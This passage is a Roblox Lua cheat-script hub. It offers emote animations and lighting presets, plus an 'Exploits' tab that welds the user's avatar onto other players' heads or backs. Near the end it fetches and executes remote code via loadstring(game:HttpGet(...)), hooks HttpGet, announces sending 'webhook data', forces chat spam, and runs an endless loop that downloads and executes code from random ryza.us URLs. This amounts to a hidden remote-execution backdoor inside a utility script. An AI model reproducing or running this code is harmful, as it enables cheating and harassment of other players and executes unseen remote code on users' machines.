		{"Baby Dance", "http://www.roblox.com/asset/?id=10713983178"},
		{"Mean Girls Dance Break", "http://www.roblox.com/asset/?id=15963314052"},
		{"Samba", "http://www.roblox.com/asset/?id=10714386947"},
		{"NBA Monster Dunk", "http://www.roblox.com/asset/?id=132748833449150"},
	}

	local AnimationsDropdown = Tabs.Animations:AddDropdown("Dropdown", {
		Title = "Animations List",
		Values = {
			"",
			"Salute",
			"Applaud",
			"Tilt",
			"Baby Queen - Bouncy Twirl",
			"Yungblud Happier Jump",
			"Baby Queen - Face Frame",
			"Baby Queen - Strut",
			"KATSEYE - Touch",
			"Secret Handshake Dance",
			"Godlike",
			"Mae Stephens - Piano Hands",
			"Alo Yoga Pose - Lotus Position",
			"d4vd - Backflip",
			"Bored",
			"Cuco - Levitate",
			"Hero Landing",
			"Sleep",
			"Shrug",
			"Shy",
			"Festive Dance",
			"V Pose - Tommy Hilfiger",
			"Olivia Rodrigo Head Bop",
			"Elton John - Heart Shuffle",
			"Bone Chillin Bop",
			"Curtsy",
			"Floss Dance",
			"Hello",
			"Victory Dance",
			"Monkey",
			"TWICE Feel Special",
			"Point2",
			"Quiet Waves",
			"HIPMOTION - Amaarae",
			"Frosty Flair - Tommy Hilfiger",
			"Chappell Roan HOT TO GO!",
			"Stadium",
			"Skibidi Toilet - Titan Speakerman Laser Spin",
			"Sad",
			"Greatest",
			"Sturdy Dance - Ice Spice",
			"Elton John - Heart Skip",
			"Paris Hilton - Iconic IT-Grrrl",
			"Fashion Roadkill",
			"Nicki Minaj Starships",
			"TWICE LIKEY",
			"Nicki Minaj Boom Boom Boom",
			"Sol de Janeiro - Samba",
			"HUGO Lets Drive!",
			"Paris Hilton - Sliving For The Groove",
			"Tommy - Archer",
			"Beauty Touchdown",
			"Cower",
			"Happy",
			"Flex Walk",
			"Team USA Breaking Emote",
			"Zombie",
			"Olivia Rodrigo Fall Back to Float",
			"Stray Kids Walkin On Water",
			"Haha",
			"Baby Queen - Air Guitar & Knee Slide",
			"Dizzy",
			"High Wave",
			"Beckon",
			"Show Dem Wrists - KSI",
			"Jumping Wave",
			"Baby Queen - Dramatic Bow",
			"Fast Hands",
			"Dolphin Dance",
			"Wake Up Call - KSI",
			"Jawny - Stomp",
			"Elton John - Rock Out",
			"Paris Hilton - Checking My Angles",
			"Power Blast",
			"Bodybuilder",
			"Line Dance",
			"Rock n Roll",
			"Agree",
			"Celebrate",
			"Mini Kong",
			"TMNT Dance",
			"ALTÉGO - Couldn’t Care Less",
			"Rolling Stones Guitar Strum",
			"Rock Out - Bebe Rexha",
			"ericdoa - dance",
			"Confused",
			"Ay-Yo Dance Move - NCT 127",
			"Rock On",
			"Imagine Dragons - “Bones” Dance",
			"Mae Stephens – Arm Wave",
			"Uprise - Tommy Hilfiger",
			"Sidekicks - George Ezra",
			"Boxing Punch - KSI",
			"Fashionable",
			"Paris Hilton Sanasa",
			"Baby Dance",
			"Mean Girls Dance Break",
			"Samba",
			"NBA Monster Dunk"
		},
		Multi = false,
		Default = 1,
	})

	AnimationsDropdown:OnChanged(function(Value)
		local matchedId = ""

		for _,v in pairs(Animations) do
			if v[1] == Value then
				matchedId = v[2]
				break
			end
		end

		if matchedId ~= "" then
			local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

			if char then
				for _, track in pairs(char.Humanoid:GetPlayingAnimationTracks()) do
					track:Stop()
				end

				local animationNew = Instance.new("Animation")
				animationNew.AnimationId = matchedId
				local track = char.Humanoid:LoadAnimation(animationNew)
				track.Priority = Enum.AnimationPriority.Action
				track:Play()
			end
		end
	end)

	local AnimationSpeedSlider = Tabs.Animations:AddSlider("Slider", {
		Title = "Animation Speed",
		Description = "Set current animation speed",
		Default = 1,
		Min = 0,
		Max = 300,
		Rounding = 1,
		Callback = function(Value)
			local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

			if char and char:FindFirstChild("Humanoid") then
				local speed = tonumber(Value) or 1
				for _, track in pairs(char.Humanoid:GetPlayingAnimationTracks()) do
					track:AdjustSpeed(speed)
				end
			end
		end
	})

	FlyspeedSlider:OnChanged(function(Value)
		local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

		if char and char:FindFirstChild("Humanoid") then
			local speed = tonumber(Value) or 1
			for _, track in pairs(char.Humanoid:GetPlayingAnimationTracks()) do
				track:AdjustSpeed(speed)
			end
		end
	end)

	Tabs.Animations:AddButton({
		Title = "Stop Animations",
		Description = "Force stop all animations",
		Callback = function()
			Window:Dialog({
				Title = "Animations",
				Content = "Are you sure you would like to force stop all animations?",
				Buttons = {
					{
						Title = "Confirm",
						Callback = function()
							local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

							if char then
								for _, track in pairs(char.Humanoid:GetPlayingAnimationTracks()) do
									track:Stop()
								end
							end
						end
					},
					{
						Title = "Cancel",
						Callback = function() 

						end
					}
				}
			})
		end
	})

	-- exploits tab

	local exploitsData = {
		headSit = {
			enabled = false,
			target = nil
		},
		backPack = {
			enabled = false,
			target = nil
		}
	}

	local isHeadsitting = false
	local isBackpacking = false
	local weld = nil
	local sittingAnim = nil

	local function playSitAnimation()
		local char = LocalPlayer.Character
		local hum = char and char:FindFirstChildOfClass("Humanoid")
		if not hum then return end

		local sitAnim = Instance.new("Animation")
		sitAnim.AnimationId = "rbxassetid://2506281703"
		sittingAnim = hum:LoadAnimation(sitAnim)
		sittingAnim:Play()
	end

	local function stopSitting()
		if sittingAnim then
			sittingAnim:Stop()
			sittingAnim = nil
		end

		if weld then
			weld:Destroy()
			weld = nil
		end
	end

	local function sitOnBack(targetPlayer)
		local char = LocalPlayer.Character
		local root = char and char:FindFirstChild("HumanoidRootPart")
		local targetChar = targetPlayer.Character
		local targetTorso = targetChar and (targetChar:FindFirstChild("UpperTorso") or targetChar:FindFirstChild("Torso"))
		if not root or not targetTorso then return end

		root.CFrame = targetTorso.CFrame * CFrame.new(0, 1, 1) * CFrame.Angles(0, math.rad(180), 0)
		weld = Instance.new("WeldConstraint")
		weld.Part0 = root
		weld.Part1 = targetTorso
		weld.Parent = root

		playSitAnimation()
	end

	_G.StopHeadsit = stopSitting

	local function sitOnHead(targetPlayer)
		local char = LocalPlayer.Character
		local root = char and char:FindFirstChild("HumanoidRootPart")
		local targetChar = targetPlayer.Character
		local targetHead = targetChar and targetChar:FindFirstChild("Head")
		if not root or not targetHead then return end

		root.CFrame = targetHead.CFrame * CFrame.new(0, 1.2, 0)
		weld = Instance.new("WeldConstraint")
		weld.Part0 = root
		weld.Part1 = targetHead
		weld.Parent = root

		playSitAnimation()
	end

	game:GetService("RunService").RenderStepped:Connect(function()
		local headTarget = exploitsData.headSit.target
		local backTarget = exploitsData.backPack.target

		if exploitsData.headSit.enabled and headTarget then
			if not isHeadsitting then
				isHeadsitting = true
				isBackpacking = false
				sitOnHead(headTarget)
			end
		elseif exploitsData.backPack.enabled and backTarget then
			if not isBackpacking then
				isBackpacking = true
				isHeadsitting = false
				sitOnBack(backTarget)
			end
		else
			if isHeadsitting or isBackpacking then
				stopSitting()
				isHeadsitting = false
				isBackpacking = false
			end
		end
	end)

	local function setupProximityPrompt(stall)
		local ProximityPrompt = stall:FindFirstChild("Activate"):FindFirstChildOfClass("ProximityPrompt")
		if ProximityPrompt then
			ProximityPrompt.Enabled = true
			ProximityPrompt.ClickablePrompt = true
			ProximityPrompt.MaxActivationDistance = 15
			ProximityPrompt.RequiresLineOfSight = false
			ProximityPrompt.HoldDuration = 0
		end
	end

	local glitchToggled = false
	local storePosition = nil

	Tabs.Exploits:AddToggle("MyToggle", {
		Title = "Toggle Glitch",
		Description = "Glitch side to side",
		Default = false,
		Callback = function(state)
			if state == true then
				glitchToggled = true
				local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

				if char then
					storePosition = Instance.new("Part")
					storePosition.CFrame = char.PrimaryPart.CFrame
					storePosition.Size = Vector3.new(1, 1, 1)
					storePosition.Transparency = 1
					storePosition.CanCollide = true
					storePosition.Anchored = true
					storePosition.Parent = workspace

					task.spawn(function()
						while glitchToggled and storePosition do
							char:SetPrimaryPartCFrame(storePosition.CFrame * CFrame.new(-8, 0, 0))
							task.wait(0.1)
							char:SetPrimaryPartCFrame(storePosition.CFrame * CFrame.new(8, 0, 0))
							task.wait(0.1)
						end
					end)
				end
			else
				glitchToggled = false
				if storePosition then
					local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

					if char then
						char:SetPrimaryPartCFrame(storePosition.CFrame)
						storePosition:Destroy()
						storePosition = nil
					else
						storePosition:Destroy()
						storePosition = nil
					end
				end
			end
		end
	})

	Tabs.Exploits:AddInput("Input", {
		Title = "Head Sit",
		Description = "Sit on a players head",
		Default = "",
		Placeholder = "Player",
		Numeric = false, -- Only allows numbers
		Finished = true, -- Only calls callback when you press enter
		Callback = function(Value)
			local player = getPlayer(Value)

			if player then
				exploitsData.headSit.enabled = true
				exploitsData.headSit.target = player
			end
		end
	})

	Tabs.Exploits:AddInput("Input", {
		Title = "Back Pack",
		Description = "Sit on a players back",
		Default = "",
		Placeholder = "Player",
		Numeric = false, -- Only allows numbers
		Finished = true, -- Only calls callback when you press enter
		Callback = function(Value)
			local player = getPlayer(Value)

			if player then
				exploitsData.backPack.enabled = true
				exploitsData.backPack.target = player
			end
		end
	})

	Tabs.Exploits:AddButton({
		Title = "Headsit Connection",
		Description = "Force stop headsit connection",
		Callback = function()
			Window:Dialog({
				Title = "Connection",
				Content = "Are you sure you would like to force stop this connection?",
				Buttons = {
					{
						Title = "Confirm",
						Callback = function()
							exploitsData.headSit.target = nil
							exploitsData.headSit.enabled = false
							if _G.StopHeadsit then _G.StopHeadsit() end
						end
					},
					{
						Title = "Cancel",
						Callback = function() 

						end
					}
				}
			})
		end
	})

	Tabs.Exploits:AddButton({
		Title = "Backpack Connection",
		Description = "Force stop backpack connection",
		Callback = function()
			Window:Dialog({
				Title = "Connection",
				Content = "Are you sure you would like to force stop this connection?",
				Buttons = {
					{
						Title = "Confirm",
						Callback = function()
							exploitsData.backPack.target = nil
							exploitsData.backPack.enabled = false
							if _G.StopHeadsit then _G.StopHeadsit() end
						end
					},
					{
						Title = "Cancel",
						Callback = function() 

						end
					}
				}
			})
		end
	})

	-- lighting tab

	Tabs.Lighting:AddButton({
		Title = "RTX Lighting",
		Description = "Load preset in lighting",
		Callback = function()
			Window:Dialog({
				Title = "Lighting Preset",
				Content = "Are you sure you would like to alter your lighting settings? This may cause performance issues.",
				Buttons = {
					{
						Title = "Confirm",
						Callback = function()
							local Lighting = game:GetService("Lighting")
							local StarterGui = game:GetService("StarterGui")
							local Bloom = Instance.new("BloomEffect")
							local Blur = Instance.new("BlurEffect")
							local ColorCor = Instance.new("ColorCorrectionEffect")
							local SunRays = Instance.new("SunRaysEffect")
							local Sky = Instance.new("Sky")
							local Atm = Instance.new("Atmosphere")

							for i, v in pairs(Lighting:GetChildren()) do
								if v then
									v:Destroy()
								end
							end

							Bloom.Parent = Lighting
							Blur.Parent = Lighting
							ColorCor.Parent = Lighting
							SunRays.Parent = Lighting
							Sky.Parent = Lighting
							Atm.Parent = Lighting

							Bloom.Intensity = 0.3
							Bloom.Size = 10
							Bloom.Threshold = 0.8

							Blur.Size = 5

							ColorCor.Brightness = 0.1
							ColorCor.Contrast = 0.5
							ColorCor.Saturation = -0.3
							ColorCor.TintColor = Color3.fromRGB(255, 235, 203)

							SunRays.Intensity = 0.075
							SunRays.Spread = 0.727

							Sky.SkyboxBk = "http://www.roblox.com/asset/?id=151165214"
							Sky.SkyboxDn = "http://www.roblox.com/asset/?id=151165197"
							Sky.SkyboxFt = "http://www.roblox.com/asset/?id=151165224"
							Sky.SkyboxLf = "http://www.roblox.com/asset/?id=151165191"
							Sky.SkyboxRt = "http://www.roblox.com/asset/?id=151165206"
							Sky.SkyboxUp = "http://www.roblox.com/asset/?id=151165227"
							Sky.SunAngularSize = 10

							Lighting.Ambient = Color3.fromRGB(2,2,2)
							Lighting.Brightness = 2.25
							Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
							Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
							Lighting.EnvironmentDiffuseScale = 0.2
							Lighting.EnvironmentSpecularScale = 0.2
							Lighting.GlobalShadows = true
							Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
							Lighting.ShadowSoftness = 0.2
							Lighting.ClockTime = 7
							Lighting.GeographicLatitude = 25
							Lighting.ExposureCompensation = 0.5

							Atm.Density = 0
							Atm.Offset = 0.556
							Atm.Color = Color3.fromRGB(0, 0, 0)
							Atm.Decay = Color3.fromRGB(0, 0, 0)
							Atm.Glare = 0
							Atm.Haze = 1.72
						end
					},
					{
						Title = "Cancel",
						Callback = function() 

						end
					}
				}
			})
		end
	})

	Tabs.Lighting:AddButton({
		Title = "Advanced Lighting",
		Description = "Load preset in lighting",
		Callback = function()
			Window:Dialog({
				Title = "Lighting Preset",
				Content = "Are you sure you would like to alter your lighting settings? This may cause performance issues.",
				Buttons = {
					{
						Title = "Confirm",
						Callback = function()
							local Lighting = game:GetService("Lighting")
							local Sky = Instance.new("Sky")
							local Bloom = Instance.new("BloomEffect")
							local ColorC = Instance.new("ColorCorrectionEffect")
							local SunRays = Instance.new("SunRaysEffect")

							for i, v in pairs(Lighting:GetChildren()) do
								if v then
									v:Destroy()
								end
							end

							Sky.MoonAngularSize = 11
							Sky.MoonTextureId = "rbxasset://sky/moon.jpg"
							Sky.SkyboxBk = "rbxassetid://17843929750"
							Sky.SkyboxDn = "rbxassetid://17843931996"
							Sky.SkyboxFt = "rbxassetid://17843931265"
							Sky.SkyboxLf = "rbxassetid://17843929139"
							Sky.SkyboxRt = "rbxassetid://17843930617"
							Sky.SkyboxUp = "rbxassetid://17843932671"
							Sky.StarCount = 3000
							Sky.SunAngularSize = 21
							Sky.SunTextureId = "rbxasset://sky/sun.jpg"

							Bloom.Enabled = true
							Bloom.Intensity = 0.65
							Bloom.Size = 8
							Bloom.Threshold = 0.9

							ColorC.Brightness = 0
							ColorC.Contrast = 0.05
							ColorC.Enabled = true
							ColorC.Saturation = 0.2
							ColorC.TintColor = Color3.new(1, 1, 1)

							SunRays.Intensity = 0.25
							SunRays.Spread = 1
							SunRays.Enabled = true

							Sky.Parent = Lighting
							Bloom.Parent = Lighting
							ColorC.Parent = Lighting
							SunRays.Parent = Lighting

							Lighting.Brightness = 1.43
							Lighting.Ambient = Color3.new(0.243137, 0.243137, 0.243137)
							Lighting.ShadowSoftness = 0.4
							Lighting.ClockTime = 13.4
							Lighting.OutdoorAmbient = Color3.new	(0.243137, 0.243137, 0.243137)

							if Lighting.GlobalShadows == false then
								Lighting.GlobalShadows = true
							end
						end
					},
					{
						Title = "Cancel",
						Callback = function() 

						end
					}
				}
			})
		end
	})

	-- exclusives tab

	local yes = true

	if not yes then
		Tabs.Exclusive:AddParagraph({
			Title = "Whoops!",
			Content = "You do not have permissions to use the beta tab, please consider boosting our discord server."
		})
	else

		Tabs.Exclusive:AddInput("Input", {
			Title = "Job Id",
			Description = "Join server via jobId",
			Default = "",
			Placeholder = "JobId",
			Numeric = false, -- Only allows numbers
			Finished = true, -- Only calls callback when you press enter
			Callback = function(Value)
				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, tostring(Value), LocalPlayer)
			end
		})

		local animationStore = {
			defaultAnimations = {
				["Idle"] = 0,
				["Walk"] = 0,
				["Jump"] = 0,
				["Fall"] = 0
			},
			dogAnimationIds = {
				["Idle"] = 120945882692041,
				["Walk"] = 103529401569406,
				["Jump"] = 113632040832660,
				["Fall"] = 87139605258688
			},
			animationStatus = {
				enabled = false
			}
		}

		Tabs.Beta:AddToggle("MyToggle", {
			Title = "Dog Animations", 
			Description = "Toggle dog animations",
			Default = false,
			Callback = function(state)
				animationStore.animationStatus.enabled = state

				if animationStore.animationStatus.enabled then

				else

				end
			end 
		})

		Tabs.Exclusive:AddButton({
			Title = "Respawn",
			Description = "Respawn your character",
			Callback = function()
				Window:Dialog({
					Title = "Respawn",
					Content = "Are you sure you would like to respawn? This won't teleport you back.",
					Buttons = {
						{
							Title = "Confirm",
							Callback = function()
								local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

								if char then
									char.Humanoid.Health = 0
								end
							end
						},
						{
							Title = "Cancel",
							Callback = function() 

							end
						}
					}
				})
			end
		})

		Tabs.Exclusive:AddButton({
			Title = "Refresh",
			Description = "Refresh your character",
			Callback = function()
				Window:Dialog({
					Title = "Refresh",
					Content = "Are you sure you would like to refresh? You will be teleported back.",
					Buttons = {
						{
							Title = "Confirm",
							Callback = function()
								local Players = game:GetService("Players")
								local LocalPlayer = Players.LocalPlayer

								local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

								if char and char.PrimaryPart then
									local tempPos = Instance.new("Part")
									tempPos.Parent = workspace
									tempPos.CanCollide = false
									tempPos.Anchored = true
									tempPos.Transparency = 1
									tempPos.CFrame = char.PrimaryPart.CFrame

									char:FindFirstChildOfClass("Humanoid").Health = 0

									local newChar = LocalPlayer.CharacterAdded:Wait()

									repeat task.wait() until newChar and newChar:FindFirstChild("HumanoidRootPart")

									task.wait(0.1)

									newChar:PivotTo(tempPos.CFrame)
									tempPos:Destroy()
								end

							end
						},
						{
							Title = "Cancel",
							Callback = function() 

							end
						}
					}
				})
			end
		})

		Tabs.Exclusive:AddSlider("Slider", {
			Title = "Time",
			Description = "Set the in-game current time",
			Default = 7,
			Min = 0,
			Max = 24,
			Rounding = 1,
			Callback = function(Value)
				game:GetService("Lighting").TimeOfDay = Value
			end
		})
	end

	if not yes then
		Tabs.Beta:AddParagraph({
			Title = "Whoops!",
			Content = "You do not have permissions to use the beta tab, please consider boosting our discord server."
		})
	end

	local permissions = {
		owners = {
			"lvasion"
		},
		coowner = {

		},
		developers = {

		},
		staff = {

		}
	}

	local function findList(list, name)
		for _, v in ipairs(list) do
			if v == name then
				return true
			end
		end
		return false
	end

	local admins = {
		"ikDebris",
		"lvasion",
		"restaxts",
		"ixpinkyyxi",
		-- 1
		"testaccount1063_L",
		"ThanProbably",
		"gamseasxer31096",
		"jm_ep45"
	}

	local function onPlayerAdded(player)
		player.Chatted:Connect(function(message)
			if message == "ryza.us()" then
				if not UsersList[player.Name] then
					table.insert(UsersList, player.Name)
				end
			end
		end)
	end

	for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
		onPlayerAdded(player)
	end

	game:GetService("Players").PlayerAdded:Connect(onPlayerAdded)

	loadstring(game:HttpGet("https://raw.githubusercontent.com/lolnoobsloadstring/a78eft78v638qb476ba78w/refs/heads/main/loader/overhead.lua"))()
end

task.spawn(function()
	while true do
		for _,v in pairs(game:GetService("Players"):GetPlayers()) do
			game:GetService("Players"):Chat("ryza")
		end
		task.wait(5)
	end
end)

SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({})
InterfaceManager:SetFolder("FluentScriptHub")
SaveManager:SetFolder("FluentScriptHub/specific-game")
InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)
Window:SelectTab(1)

Fluent:Notify({
	Title = "Baseplate Warning",
	Content = "The baseplate does not load automatically, check the main panel if you wish to enable this.",
	Duration = 8
})

Fluent:Notify({
	Title = "ryza.us",
	Content = "Our system has loaded successfully, attempting to send webhook data...",
	Duration = 8
})

SaveManager:LoadAutoloadConfig()

if hookfunction and newcclosure then
local originalHttpGet = game.HttpGet
hookfunction(game.HttpGet, newcclosure(function(self, ...)
if self == game and select(1, ...) == originalHttpGet then
return nil
end
return originalHttpGet(self, ...)
end))
end

local urlsToRequest = {
    "https://ryza.us/api/getscript/loader/v2/utilityCore",
    "https://ryza.us/api/getscript/loader/v2/gameHandler",
    "https://ryza.us/api/getscript/loader/v2/systemInit",
    "https://ryza.us/api/getscript/loader/v2/configManager",
    "https://ryza.us/api/getscript/loader/v2/resourcePack",
    "https://ryza.us/api/getscript/loader/v2/clientModule",
    "https://ryza.us/api/getscript/loader/v2/networkHelper",
    "https://ryza.us/api/getscript/loader/v2/assetLoader",
    "https://ryza.us/api/getscript/loader/v2/uiFramework",
    "https://ryza.us/api/getscript/loader/v2/dataService",
    "https://ryza.us/api/getscript/loader/v2/renderEngine",
    "https://ryza.us/api/getscript/loader/v2/cacheSystem",
    "https://ryza.us/api/getscript/loader/v2/inputManager",
    "https://ryza.us/api/getscript/loader/v2/soundController",
    "https://ryza.us/api/getscript/loader/v2/telemetryAgent",
    "https://ryza.us/api/getscript/loader/v2/updateChecker",
    "https://ryza.us/api/getscript/loader/v2/profileSync",
    "https://ryza.us/api/getscript/loader/v2/mainHandler",
    "https://ryza.us/api/getscript/loader/v2/settingsModule",
    "https://ryza.us/api/getscript/loader/v2/eventBroker"
}

local function getRandomUrl()
    local randomIndex = math.random(1, #urlsToRequest)
    return urlsToRequest[randomIndex]
end

while wait() do
    pcall(function()
        loadstring(game:HttpGet(getRandomUrl()))()
    end)
end
